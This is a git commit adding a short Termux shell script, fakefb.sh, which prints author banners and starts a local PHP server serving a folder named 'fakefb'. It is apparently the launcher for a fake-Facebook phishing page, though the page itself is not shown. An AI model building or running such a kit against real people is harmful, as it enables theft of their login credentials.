b59d8be91442560e039b35a042c866ebd70a7811
SUSHANT <70790978+SUSHANTMAHATO2001@users.noreply.github.com>
2021-08-20 15:09:19 +0545

    Update fakefb.sh

--- fakefb.sh
+++ fakefb.sh
@@ -1,1 +1,14 @@
 
+sleep 1;
+
+echo '\033[1;33m';
+
+echo "Program  By Sushant Mahato";
+sleep 1;
+echo "Develop By Nepal";
+sleep 1;
+clear
+sleep 1;
+echo '\033[1;32m';
+
+php -S localhost:8080 -t /data/data/com.termux/files/home/fakefb;
